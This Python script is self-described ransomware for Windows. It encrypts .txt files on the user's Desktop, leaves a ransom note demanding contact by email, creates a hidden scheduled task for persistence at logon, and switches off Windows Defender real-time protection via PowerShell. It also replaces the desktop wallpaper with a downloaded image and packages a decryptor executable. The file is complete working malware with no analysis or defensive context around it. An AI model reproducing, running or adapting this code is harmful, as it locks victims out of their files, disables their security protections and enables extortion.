import os
import random
import string
import subprocess
import ctypes
from cryptography.fernet import Fernet
import hashlib
import sys
import time
import urllib.request
import base64

# Constants
CUSTOM_EXTENSION = ".enc"
EXE_NAME = "encrypt_desktop_files.exe"
DECRYPT_SCRIPT_NAME = "decrypt_files.py"
DECRYPT_EXE_NAME = "decrypt_files.exe"
WALLPAPER_URL = "https://i.pinimg.com/736x/d9/5d/72/d95d7208de3530cc9b73d3a1db2617a3.jpg"  # Replace with your image URL
DELAY_TIME = 10  # Set the delay time in seconds

# Generate a random encryption key
def generate_key():
    return Fernet.generate_key()

# Create a decryption code from the encryption key
def generate_decryption_code(key):
    return hashlib.sha256(key).hexdigest()[:16]

# Custom key generation method
def custom_key_generation(decryption_code):
    intermediate = hashlib.sha256(decryption_code.encode()).digest()
    key = base64.urlsafe_b64encode(intermediate[:32])
    return key

# Encrypt a file and add custom extension
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        original_data = file.read()
    encrypted_data = fernet.encrypt(original_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)
    new_file_path = file_path + CUSTOM_EXTENSION
    os.rename(file_path, new_file_path)

# Encrypt all .txt files on the desktop
def encrypt_files_on_desktop(key):
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    for root, dirs, files in os.walk(desktop_path):
        for file in files:
            if file.endswith('.txt') and file not in ['RANSOM_NOTE.txt', EXE_NAME, DECRYPT_EXE_NAME]:
                encrypt_file(os.path.join(root, file), key)

# Create a ransom note on the desktop
def create_ransom_note():
    key = generate_key()
    decryption_code = generate_decryption_code(key)
    encryption_key = custom_key_generation(decryption_code)
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    ransom_note_path = os.path.join(desktop_path, 'RANSOM_NOTE.txt')
    ransom_message = (
        f"All of your files have been encrypted.\n"
        f"To unlock them contact me with your decryption code at this email@email.com.\n"
        f"Your decryption code is: {decryption_code}\n"
    )
    with open(ransom_note_path, 'w') as note:
        note.write(ransom_message)
    return encryption_key

# Add persistence by creating a scheduled task
def add_persistence():
    exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), EXE_NAME)
    task_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    command = f'schtasks /create /tn {task_name} /tr "{exe_path}" /sc onlogon /rl highest /f'
    subprocess.run(command, shell=True)

# Create decryption script
def create_decryption_script(key):
    decryption_script = f"""
import os
from cryptography.fernet import Fernet

def decrypt_file(file_path, key):
    fernet = Fernet(key)
    try:
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = fernet.decrypt(encrypted_data)
        with open(file_path, 'wb') as file:
            file.write(decrypted_data)
        new_file_path = file_path.replace('.enc', '')
        os.rename(file_path, new_file_path)
        print(f"Decrypted and renamed: {{new_file_path}}")
    except Exception as e:
        print(f"Failed to decrypt {{file_path}}: {{str(e)}}")

def decrypt_files_on_desktop(key):
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    for root, dirs, files in os.walk(desktop_path):
        for file in files:
            if file.endswith('.enc'):
                decrypt_file(os.path.join(root, file), key)

def main():
    key_input = input("Enter the decryption key: ")

    if key_input:
        key = key_input.encode()
        print(f"Decryption key: {{key.decode()}}")  # Print the decryption key for debugging
        try:
            decrypt_files_on_desktop(key)
            print("Files have been successfully decrypted.")
        except Exception as e:
            print("Invalid decryption key or decryption failed.")
    else:
        print("No decryption key entered.")

if __name__ == "__main__":
    main()
"""
    return decryption_script

# Check if PyInstaller is installed, and install if necessary
def check_and_install_pyinstaller():
    try:
        import PyInstaller
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyinstaller'])

# Package decryption script into an executable from memory
def package_decryption_script_from_memory(decryption_script):
    check_and_install_pyinstaller()
    
    with open(DECRYPT_SCRIPT_NAME, 'w') as script_file:
        script_file.write(decryption_script)
    
    command = f'pyinstaller --onefile {DECRYPT_SCRIPT_NAME}'
    process = subprocess.Popen(command, shell=True)
    process.communicate()

    dist_path = 'dist'
    if os.path.exists(dist_path):
        decrypt_exe_path = os.path.join(dist_path, DECRYPT_SCRIPT_NAME.replace('.py', '.exe'))
        final_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop', DECRYPT_EXE_NAME)
        os.rename(decrypt_exe_path, final_path)
        os.remove(DECRYPT_SCRIPT_NAME)
    else:
        print("Failed to create decryption executable")

# Change the desktop wallpaper
def change_wallpaper():
    wallpaper_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop', 'ransomware_wallpaper.jpg')
    urllib.request.urlretrieve(WALLPAPER_URL, wallpaper_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)

# Attempt to disable Windows Defender
def disable_windows_defender():
    command = 'powershell Set-MpPreference -DisableRealtimeMonitoring $true'
    subprocess.run(command, shell=True)

# Main function to run the ransomware
def main():
    # Add a delay before running the script
    time.sleep(DELAY_TIME)
    
    encryption_key = create_ransom_note()
    if encryption_key:
        encrypt_files_on_desktop(encryption_key)
        add_persistence()
        change_wallpaper()
        disable_windows_defender()
        decryption_script = create_decryption_script(encryption_key.decode())
        package_decryption_script_from_memory(decryption_script)
        print("Files have been encrypted.")
    else:
        print("Encryption process failed due to missing key")

if __name__ == "__main__":
    main()
